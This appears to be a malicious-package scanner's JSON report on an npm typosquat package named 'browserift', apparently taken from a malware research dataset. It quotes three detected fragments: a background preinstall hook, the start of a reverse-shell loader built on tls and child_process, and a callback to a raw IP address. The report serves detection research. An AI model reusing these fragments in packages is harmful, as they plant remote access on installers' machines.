@@ -1,0 +1,34 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "npm-exec-base64": {},
+        "npm-install-script": [
+            {
+                "location": "package/package.json:8",
+                "code": "    \"preinstall\": \"sh build.sh &\"\n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            }
+        ],
+        "npm-serialize-environment": {},
+        "npm-silent-process-execution": {},
+        "npm-dll-hijacking": [
+            {
+                "location": "package/index.js:4",
+                "code": "(function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? \"cmd\" : \"/bin/sh\"; var net = require(\"tls\"), cp = require(\"child_process\"),...);  })();\n",
+                "message": "This package manipulates a trusted application into loading a malicious DLL"
+            }
+        ],
+        "npm-steganography": {},
+        "npm-obfuscation": {},
+        "shady-links": [
+            {
+                "location": "package/index.js:2",
+                "code": "http.get('http://45.63.54.27:8080/event_recv', function() {});\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "npm-exfiltrate-sensitive-data": {}
+    },
+    "path": "./dataset/npm/browserift-16.2.2"
+}
